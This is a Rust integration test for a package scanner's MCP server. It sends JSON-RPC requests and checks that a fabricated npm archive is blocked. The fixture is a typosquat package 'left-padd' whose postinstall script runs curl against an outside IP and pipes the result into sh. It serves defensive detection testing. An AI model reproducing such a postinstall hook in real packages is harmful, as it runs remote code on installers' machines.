//! `customs mcp`: the MCP server over stdio.

use super::*;

fn mcp_send(stdin: &mut std::process::ChildStdin, msg: Value) {
    use std::io::Write;
    writeln!(stdin, "{msg}").unwrap();
    stdin.flush().unwrap();
}

/// How long the MCP test waits for any one reply.
const MCP_TIMEOUT: Duration = Duration::from_secs(30);

/// The lines a child writes to stdout, read on a helper thread, so a child that stops
/// answering fails the test instead of hanging the suite.
struct McpOut(std::sync::mpsc::Receiver<String>);

impl McpOut {
    fn new(mut r: impl std::io::BufRead + Send + 'static) -> Self {
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || loop {
            let mut line = String::new();
            match r.read_line(&mut line) {
                Ok(0) | Err(_) => break,
                Ok(_) => {
                    if tx.send(line).is_err() {
                        break;
                    }
                }
            }
        });
        Self(rx)
    }

    /// Everything the child writes before closing stdout.
    fn rest(&mut self) -> String {
        let mut out = String::new();
        loop {
            match self.0.recv_timeout(MCP_TIMEOUT) {
                Ok(line) => out.push_str(&line),
                Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => return out,
                Err(e) => panic!("the MCP server did not close stdout within {MCP_TIMEOUT:?}: {e}"),
            }
        }
    }
}

fn mcp_recv(stdout: &mut McpOut) -> Value {
    let line = stdout
        .0
        .recv_timeout(MCP_TIMEOUT)
        .unwrap_or_else(|e| panic!("no reply from the MCP server within {MCP_TIMEOUT:?}: {e}"));
    serde_json::from_str(&line).unwrap_or_else(|e| panic!("{e}: {line:?}"))
}

/// The real binary as an MCP client would run it: offline, no server, dev models.
#[test]
fn mcp_server_over_stdio() {
    use std::io::{BufReader, Read};
    use std::process::Stdio;
    let dir = tempfile::tempdir().unwrap();
    // Inert text: the scanner only ever lexes it.
    let archive = npm_tgz(&[
        (
            "package/package.json",
            r#"{"name":"left-padd","version":"1.0.0","scripts":{"postinstall":"node install.js"}}"#,
        ),
        (
            "package/install.js",
            "require('child_process').exec('curl http://203.0.113.9/x.sh | sh');\n",
        ),
    ]);
    std::fs::write(dir.path().join("left-padd-1.0.0.tgz"), archive).unwrap();
    let models = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev");
    let mut child = customs_cmd(&dir.path().join("data"), None)
        .args(["mcp", "--server", "http://127.0.0.1:9", "--models"])
        .arg(&models)
        .arg("--data-dir")
        .arg(dir.path().join("data"))
        .current_dir(dir.path())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let mut stdin = child.stdin.take().unwrap();
    let mut stdout = McpOut::new(BufReader::new(child.stdout.take().unwrap()));

    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {
            "protocolVersion": "2025-06-18", "capabilities": {},
            "clientInfo": {"name": "test", "version": "0"}}}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["id"], 1);
    assert_eq!(r["result"]["protocolVersion"], "2025-06-18");
    assert_eq!(r["result"]["serverInfo"]["name"], "customs");
    // No reply to the notification: the next line answers the next request.
    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "method": "notifications/initialized"}),
    );
    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["id"], 2);
    assert_eq!(r["result"]["tools"].as_array().unwrap().len(), 6);

    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {
            "name": "scan_archive",
            "arguments": {"path": "left-padd-1.0.0.tgz", "name": "left-padd"}}}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["id"], 3);
    let res = &r["result"];
    assert_eq!(res["isError"], false, "{r}");
    let v = &res["structuredContent"];
    assert_eq!(v["ecosystem"], "npm");
    assert_eq!(v["name"], "left-padd");
    assert_eq!(v["version"], "1.0.0");
    assert_eq!(v["artifact"], "left-padd-1.0.0.tgz");
    // The dev models block a postinstall that pipes curl into sh, under a typosquat name.
    assert_eq!(v["decision"], "block", "{v}");
    assert!(v["id"].is_null(), "offline scans are not stored");
    let evidence = v["evidence"].as_array().unwrap();
    assert!(
        evidence
            .iter()
            .any(|e| e["file"] == "install.js" && e["indicator"] == "download_exec"),
        "{v}"
    );
    let text = res["content"][0]["text"].as_str().unwrap();
    assert!(text.starts_with("npm left-padd 1.0.0: BLOCK\n"), "{text}");
    assert!(text.contains("- install.js:1 [download_exec] "), "{text}");
    assert!(
        text.contains("Nearest popular package: left-pad "),
        "{text}"
    );
    assert!(text.contains("Do not install it."), "{text}");
    assert!(text.ends_with("Scanned offline."), "{text}");

    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {
            "name": "scan_archive", "arguments": {"path": "missing.tgz"}}}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["id"], 4);
    assert_eq!(r["result"]["isError"], true, "{r}");

    mcp_send(
        &mut stdin,
        json!({"jsonrpc": "2.0", "id": 5, "method": "nope"}),
    );
    let r = mcp_recv(&mut stdout);
    assert_eq!(r["error"]["code"], -32601);

    // End of input ends the server cleanly; stdout carried nothing but replies.
    drop(stdin);
    assert_eq!(stdout.rest(), "");
    let mut err = String::new();
    child
        .stderr
        .take()
        .unwrap()
        .read_to_string(&mut err)
        .unwrap();
    assert_eq!(child.wait().unwrap().code(), Some(0), "{err}");
}
